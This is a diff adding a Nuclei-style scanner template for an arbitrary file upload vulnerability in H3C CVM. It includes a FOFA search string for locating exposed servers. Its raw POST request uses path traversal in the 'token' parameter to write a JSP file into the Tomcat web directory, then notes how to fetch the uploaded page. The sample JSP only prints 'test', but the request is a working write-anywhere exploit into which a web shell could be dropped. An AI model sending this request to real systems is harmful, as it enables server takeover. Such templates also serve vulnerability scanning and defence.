@@ -1,0 +1,35 @@
+id: poc-kkaw8yemvnqqv7f9
+info:
+  name: H3C CVM upload前台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kkaw8yemvnqqv7f9'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kkaw8yemvnqqv7f9
+    fofa: server="H3C-CVM"
+http:
+- raw:
+  - 'POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp&name=123 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Range: bytes 0-10/20
+
+    Referer: http://your-ip/cas/login
+
+    Accept-Encoding: gzip
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+
+    <%out.println("test");%>
+
+
+    上传定位：GET //cas/js/lib/buttons/a.jsp HTTP/1.1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
